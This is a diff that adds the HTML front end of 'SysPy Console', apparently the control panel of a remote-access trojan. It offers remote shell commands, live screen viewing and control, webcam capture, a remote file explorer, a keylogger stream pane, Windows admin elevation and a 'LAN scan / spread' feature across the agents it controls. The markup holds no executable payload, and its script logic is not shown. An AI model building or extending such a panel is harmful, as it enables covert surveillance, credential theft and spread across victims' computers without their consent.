@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SysPy Console</title>
+<link rel="stylesheet" href="style.css?v=5.3.0">
+<link rel="stylesheet" href="mobile.css?v=5.3.0">
+<script defer src="https://cdnjs.cloudflare.com/ajax/libs/monaco-editor/0.45.0/min/vs/loader.min.js"></script>
+</head>
+<body>
+
+<div id="login" class="login">
+  <form id="login-form" class="login-card" onsubmit="event.preventDefault(); handleLogin(event); return false;">
+    <h1>SysPy</h1>
+    <p class="muted">Enter the controller password printed in your terminal.</p>
+    <input id="password" type="password" placeholder="password" autocomplete="current-password" autofocus onkeydown="if(event.key==='Enter'){event.preventDefault(); handleLogin(event);}">
+    <button id="login-btn" type="button" onclick="handleLogin(event)">Connect</button>
+    <p id="login-error" class="error"></p>
+  </form>
+</div>
+
+<div id="app" class="layout hidden">
+  <aside class="sidebar">
+    <div class="brand">
+      <span class="dot" id="relay-dot"></span>
+      <div>
+        <strong>SysPy</strong>
+        <small id="relay-label">connecting...</small>
+      </div>
+    </div>
+    <div class="sidebar-head">
+      <span id="agent-count">0 agents</span>
+      <label class="chk"><input type="checkbox" id="sel-all"> all</label>
+      <button class="ghost" id="refresh">&#8635;</button>
+    </div>
+    <ul id="agent-tree" class="agent-tree"></ul>
+    <div id="sel-bar" class="sel-bar hidden">
+      <span id="sel-count">0 selected</span>
+      <select id="sel-mode">
+        <option value="selected">Selected</option>
+        <option value="all">All</option>
+        <option value="online">Online only</option>
+      </select>
+      <button class="primary sm" id="sel-run">Run</button>
+      <button class="sm" id="sel-push">Push</button>
+      <button class="sm" id="sel-restart">Restart</button>
+      <button class="danger sm" id="sel-uninstall">Uninstall</button>
+      <button class="danger sm" id="sel-purge">Purge</button>
+      <input id="sel-pattern" placeholder="rename pattern {n} {host}" size="18">
+      <button class="sm" id="sel-rename">Rename</button>
+    </div>
+    <div class="sidebar-foot">
+      <button class="ghost wide" id="addpc-btn">Add a PC...</button>
+      <button class="ghost wide" id="lan-btn">LAN scan / spread</button>
+      <button class="ghost wide" id="broadcast-btn">Broadcast...</button>
+      <button class="ghost wide" id="push-btn">Push build</button>
+      <span id="relay-queue" class="muted text-xs"></span>
+    </div>
+  </aside>
+
+  <main class="main">
+    <header class="topbar">
+      <div class="who">
+        <strong id="current-name">No agent selected</strong>
+        <small id="current-meta" class="muted"></small>
+        <button id="elevate-btn" class="warn sm hidden" title="Request Windows UAC Administrator Elevation">⚡ Elevate to Admin</button>
+      </div>
+      <nav class="tabs">
+        <button data-tab="terminal" class="tab active">Terminal</button>
+        <button data-tab="screen" class="tab">Screen</button>
+        <button data-tab="files" class="tab">Files</button>
+        <button data-tab="keys" class="tab">Keys</button>
+        <button data-tab="system" class="tab">System</button>
+        <button data-tab="controller" class="tab">Controller</button>
+      </nav>
+    </header>
+
+    <section id="pane-terminal" class="pane active">
+      <div class="terminal-toolbar">
+        <div class="term-left">
+          <span class="term-title">SYS://SHELL</span>
+          <span id="term-status" class="badge online">READY</span>
+        </div>
+        <div class="term-actions">
+          <button id="term-split-btn" class="ghost sm" title="Toggle Split View with Screen">Split View</button>
+          <button id="term-autoscroll-btn" class="ghost sm active" title="Toggle Auto-Scroll">Scroll: Auto</button>
+          <button id="term-copy-btn" class="ghost sm" title="Copy Console Content">Copy Log</button>
+          <button id="term-clear-btn" class="ghost sm" title="Clear Console">Clear</button>
+        </div>
+      </div>
+      <div id="terminal-container" class="terminal-container">
+        <div id="terminal" class="terminal"></div>
+        <div id="split-screen-preview" class="split-screen hidden">
+          <div class="split-header">
+            <span>LIVE SCREEN PREVIEW</span>
+            <button id="split-close-btn" class="ghost sm">✕</button>
+          </div>
+          <div class="split-img-box">
+            <img id="split-screen-img" alt="split screen">
+          </div>
+        </div>
+      </div>
+      <form id="command-form" class="command-bar">
+        <span class="prompt">nord@syspy:~$</span>
+        <input id="command" placeholder="Enter any CMD / PowerShell / Python command (e.g. dir, whoami, py print(1+1), shot)..." autocomplete="off" spellcheck="false">
+        <button type="submit" class="primary">Execute</button>
+      </form>
+      <div id="quick" class="quick"></div>
+    </section>
+
+    <section id="pane-screen" class="pane">
+      <div class="screen-toolbar">
+        <div class="screen-mode-controls">
+          <button class="primary" data-quick="shot">Capture 100%</button>
+          <button data-quick="shot 50">Fast 50%</button>
+          <button id="live-btn">Live Stream: OFF</button>
+          <button id="fs-btn">Fullscreen</button>
+          <label class="toggle-control">
+            <input type="checkbox" id="interactive-mouse-toggle">
+            <span>Interactive Click/Type</span>
+          </label>
+        </div>
+        <div class="screen-info-badge">
+          <span id="screen-meta">No capture loaded</span>
+        </div>
+      </div>
+      <div class="screen-wrap" id="screen-interactive-wrap">
+        <img id="screen-img" alt="latest screenshot" tabindex="0">
+        <p id="screen-empty" class="muted">No screenshot yet. Click 'Capture' or toggle 'Interactive Click/Type'.</p>
+      </div>
+      <div class="screen-shortcuts-row">
+        <span class="muted text-xs">SHORTCUTS:</span>
+        <button class="ghost sm" data-quick="power.lock">Lock PC</button>
+        <button class="ghost sm" data-quick="vol mute">Mute Audio</button>
+        <button class="ghost sm" data-quick="vol up">Vol +</button>
+        <button class="ghost sm" data-quick="vol down">Vol -</button>
+        <button class="ghost sm" data-quick="cam">Webcam</button>
+        <button class="ghost sm" id="download-screen-btn">Save Image</button>
+      </div>
+    </section>
+
+    <section id="pane-files" class="pane">
+      <!-- File Explorer Toolbar -->
+      <div class="fe-toolbar">
+        <div class="fe-nav-buttons">
+          <button id="fe-btn-back" class="ghost sm" title="Back (Alt+Left)">⮜</button>
+          <button id="fe-btn-forward" class="ghost sm" title="Forward (Alt+Right)">⮞</button>
+          <button id="fe-btn-up" class="ghost sm" title="Up to Parent (Alt+Up)">⮝</button>
+          <button id="fe-btn-thispc" class="sm" title="This PC">💻 This PC</button>
+          <button id="fe-btn-refresh" class="ghost sm" title="Refresh (F5)">⟳</button>
+        </div>
+
+        <div class="fe-address-bar-wrap">
+          <div id="fe-breadcrumbs" class="fe-breadcrumbs" title="Click to edit path">
+            <span class="fe-crumb active">💻 This PC</span>
+          </div>
+          <input id="fe-path-input" class="fe-path-input hidden" spellcheck="false" autocomplete="off" placeholder="Type a path (e.g. C:\Windows or This PC) and press Enter">
+          <button id="fe-btn-copy-path" class="ghost sm" title="Copy Current Path">📋</button>
+        </div>
+
+        <div class="fe-search-wrap">
+          <input id="fe-search-input" placeholder="Search (Enter)..." spellcheck="false">
+          <button id="fe-btn-search-clear" class="ghost sm hidden" title="Clear Search">✕</button>
+        </div>
+
+        <div class="fe-action-buttons">
+          <button id="fe-btn-new-folder" class="sm" title="New Folder">+ Folder</button>
+          <button id="fe-btn-new-file" class="sm" title="New File">+ File</button>
+          <label class="file-label sm" title="Upload files to remote directory">
+            Upload
+            <input type="file" id="fe-upload-input" multiple hidden>
+          </label>
+          <button id="fe-btn-download" class="ghost sm" title="Download selected item or current folder as ZIP">Download</button>
+          <button id="fe-btn-view-toggle" class="ghost sm" title="Toggle Details / Tiles / List">View: Details</button>
+        </div>
+      </div>
+
+      <!-- File Explorer Main Container -->
+      <div class="fe-container" id="fe-dropzone">
+        <!-- Navigation Sidebar -->
+        <aside class="fe-sidebar">
+          <div class="fe-sidebar-group">
+            <div class="fe-sidebar-title">QUICK ACCESS</div>
+            <div class="fe-sidebar-item active" data-path="This PC" id="fe-sb-thispc">
+              <span class="fe-icon">💻</span> <span class="fe-label">This PC</span>
+            </div>
+            <div id="fe-sidebar-specials"></div>
+          </div>
+
+          <div class="fe-sidebar-group">
+            <div class="fe-sidebar-title">DRIVES</div>
+            <div id="fe-sidebar-drives"></div>
+          </div>
+
+          <div class="fe-sidebar-group">
+            <div class="fe-sidebar-title-row">
+              <span class="fe-sidebar-title">BOOKMARKS</span>
+              <button id="fe-btn-add-bookmark" class="ghost sm" title="Bookmark current folder">+</button>
+            </div>
+            <div id="fe-sidebar-bookmarks"></div>
+          </div>
+
+          <div class="fe-sidebar-group">
+            <div class="fe-sidebar-title">RECENT LOCATIONS</div>
+            <div id="fe-sidebar-recents"></div>
+          </div>
+        </aside>
+
+        <!-- Main Explorer Content View -->
+        <div class="fe-main-pane">
+          <!-- Drive Cards View ("This PC") -->
+          <div id="fe-thispc-view" class="fe-thispc-view">
+            <div class="fe-section-heading">Devices and Drives</div>
+            <div id="fe-drives-grid" class="fe-drives-grid"></div>
+          </div>
+
+          <!-- Directory Items View (Table/Grid) -->
+          <div id="fe-items-view" class="fe-items-view hidden">
+            <div class="fe-table-header" id="fe-table-header">
+              <div class="fe-col fe-col-check"><input type="checkbox" id="fe-select-all" title="Select All"></div>
+              <div class="fe-col fe-col-name sortable" data-sort="name">Name <span class="sort-indicator"></span></div>
+              <div class="fe-col fe-col-modified sortable" data-sort="modified">Date modified <span class="sort-indicator"></span></div>
+              <div class="fe-col fe-col-type sortable" data-sort="type">Type <span class="sort-indicator"></span></div>
+              <div class="fe-col fe-col-size sortable" data-sort="size">Size <span class="sort-indicator"></span></div>
+              <div class="fe-col fe-col-attr">Attributes</div>
+              <div class="fe-col fe-col-actions">Actions</div>
+            </div>
+            <div id="fe-items-body" class="fe-items-body"></div>
+          </div>
+
+          <!-- Search Results View -->
+          <div id="fe-search-results-view" class="fe-search-results-view hidden">
+            <div class="fe-search-summary" id="fe-search-summary"></div>
+            <div id="fe-search-items-body" class="fe-items-body"></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Explorer Status Footer -->
+      <div class="fe-status-bar">
+        <div class="fe-status-left" id="fe-status-selection">0 items</div>
+        <div class="fe-status-right" id="fe-status-drive">Ready</div>
+      </div>
+    </section>
+
+    <section id="pane-keys" class="pane">
+      <div class="keys-toolbar">
+        <span>KEYLOGGER STREAM</span>
+        <div class="row">
+          <button class="primary sm" data-quick="key start">Start Recording</button>
+          <button class="sm" data-quick="key dump">Dump Buffer</button>
+          <button class="sm" data-quick="key stop">Stop</button>
+          <button id="clear-keys" class="ghost sm">Clear View</button>
+        </div>
+      </div>
+      <pre id="keys-output" class="terminal"></pre>
+    </section>
+
+    <section id="pane-controller" class="pane">
+      <div class="ctrl-toolbar">
+        <span id="ctrl-relay" class="badge">relay ?</span>
+        <select id="ctrl-level">
+          <option value="">All levels</option>
+          <option value="INFO">INFO+</option>
+          <option value="WARNING">WARNING+</option>
+          <option value="ERROR">ERROR only</option>
+        </select>
+        <button class="ghost sm" id="ctrl-pause">Pause</button>
+        <button class="ghost sm" id="ctrl-clear">Clear</button>
+        <button class="ghost sm" id="ctrl-copy">Copy</button>
+        <button class="ghost sm" id="ctrl-agent-log">Agent log</button>
+      </div>
+      <pre id="ctrl-output" class="terminal ctrl-output"></pre>
+    </section>
+
+    <section id="pane-system" class="pane">
+      <div class="power-bar">
+        <span class="power-title">POWER & CONTROLS:</span>
+        <button class="danger sm" id="power-shutdown-btn">Shutdown PC</button>
+        <button class="warn sm" id="power-restart-btn">Restart PC</button>
+        <button class="ghost sm" data-quick="power.sleep">Sleep</button>
+        <button class="ghost sm" data-quick="power.lock">Lock</button>
+        <button class="ghost sm" data-quick="vol mute">Mute</button>
+        <button class="ghost sm" data-quick="beep">Beep</button>
+      </div>
+      <div id="system-cards" class="cards"></div>
+      <div class="row wrap" id="system-actions"></div>
+      <pre id="system-output" class="terminal"></pre>
+    </section>
+  </main>
+</div>
+
+<!-- Remote File Editor Modal (Monaco) -->
+<div id="fe-editor-modal" class="fe-modal-overlay hidden">
+  <div class="fe-editor-window">
+    <div class="fe-editor-header">
+      <div class="fe-editor-title-wrap">
+        <span class="fe-editor-icon">📝</span>
+        <span id="fe-editor-title" class="fe-editor-title">untitled.txt</span>
+        <span id="fe-editor-dirty" class="fe-editor-badge modified hidden">● MODIFIED</span>
+        <span id="fe-editor-path" class="fe-editor-path muted"></span>
+      </div>
+      <div class="fe-editor-meta-badges">
+        <span id="fe-editor-encoding" class="fe-badge">UTF-8</span>
+        <span id="fe-editor-crlf" class="fe-badge">CRLF</span>
+        <span id="fe-editor-size" class="fe-badge">0 B</span>
+      </div>
+      <div class="fe-editor-actions">
+        <button id="fe-editor-save-btn" class="primary sm" title="Save to Remote PC (Ctrl+S)">💾 Save</button>
+        <button id="fe-editor-reload-btn" class="ghost sm" title="Reload from Host">⟳ Reload</button>
+        <button id="fe-editor-fullscreen-btn" class="ghost sm" title="Toggle Fullscreen">⛶</button>
+        <button id="fe-editor-close-btn" class="ghost sm" title="Close Editor (Esc)">✕</button>
+      </div>
+    </div>
+    <div id="fe-monaco-container" class="fe-monaco-container">
+      <textarea id="fe-editor-fallback" class="fe-editor-fallback hidden" spellcheck="false"></textarea>
+    </div>
+    <div class="fe-editor-statusbar">
+      <span id="fe-editor-cursor-pos">Ln 1, Col 1</span>
+      <span id="fe-editor-lang">Plain Text</span>
+      <span id="fe-editor-status">Ready</span>
+    </div>
+  </div>
+</div>
+
+<!-- File / Folder Properties Modal -->
+<div id="fe-properties-modal" class="fe-modal-overlay hidden">
+  <div class="fe-dialog-window">
+    <div class="fe-dialog-header">
+      <span id="fe-prop-title">Properties</span>
+      <button id="fe-prop-close" class="ghost sm">✕</button>
+    </div>
+    <div class="fe-dialog-body" id="fe-prop-body">
+      <!-- Injected dynamically -->
+    </div>
+    <div class="fe-dialog-footer">
+      <button id="fe-prop-ok" class="primary sm">OK</button>
+    </div>
+  </div>
+</div>
+
+<!-- Explorer Context Menu -->
+<div id="fe-context-menu" class="fe-context-menu hidden">
+  <div class="fe-menu-item" data-action="open"><span class="fe-menu-icon">📂</span> Open <span class="fe-menu-key">Enter</span></div>
+  <div class="fe-menu-item" data-action="edit"><span class="fe-menu-icon">📝</span> Edit in Code Editor</div>
+  <div class="fe-menu-item" data-action="download"><span class="fe-menu-icon">⬇</span> Download</div>
+  <div class="fe-menu-divider"></div>
+  <div class="fe-menu-item" data-action="cut"><span class="fe-menu-icon">✂</span> Cut <span class="fe-menu-key">Ctrl+X</span></div>
+  <div class="fe-menu-item" data-action="copy"><span class="fe-menu-icon">📋</span> Copy <span class="fe-menu-key">Ctrl+C</span></div>
+  <div class="fe-menu-item" data-action="paste"><span class="fe-menu-icon">📥</span> Paste <span class="fe-menu-key">Ctrl+V</span></div>
+  <div class="fe-menu-divider"></div>
+  <div class="fe-menu-item" data-action="new-folder"><span class="fe-menu-icon">📁</span> New Folder</div>
+  <div class="fe-menu-item" data-action="new-file"><span class="fe-menu-icon">📄</span> New File</div>
+  <div class="fe-menu-item" data-action="refresh"><span class="fe-menu-icon">🔄</span> Refresh <span class="fe-menu-key">F5</span></div>
+  <div class="fe-menu-divider"></div>
+  <div class="fe-menu-item" data-action="rename"><span class="fe-menu-icon">🏷</span> Rename <span class="fe-menu-key">F2</span></div>
+  <div class="fe-menu-item" data-action="delete"><span class="fe-menu-icon">🗑</span> Delete (Recycle Bin) <span class="fe-menu-key">Del</span></div>
+  <div class="fe-menu-item" data-action="delete-perm"><span class="fe-menu-icon">🔥</span> Delete Permanently <span class="fe-menu-key">Shift+Del</span></div>
+  <div class="fe-menu-divider"></div>
+  <div class="fe-menu-item" data-action="properties"><span class="fe-menu-icon">ℹ</span> Properties <span class="fe-menu-key">Alt+Enter</span></div>
+</div>
+
+<!-- Upload / Transfer Progress Drawer -->
+<div id="fe-transfer-drawer" class="fe-transfer-drawer hidden">
+  <div class="fe-transfer-header">
+    <span id="fe-transfer-title">File Transfers</span>
+    <button id="fe-transfer-close" class="ghost sm">✕</button>
+  </div>
+  <div id="fe-transfer-list" class="fe-transfer-list"></div>
+</div>
+
+<script src="app.js?v=5.3.0"></script>
+</body>
+</html>
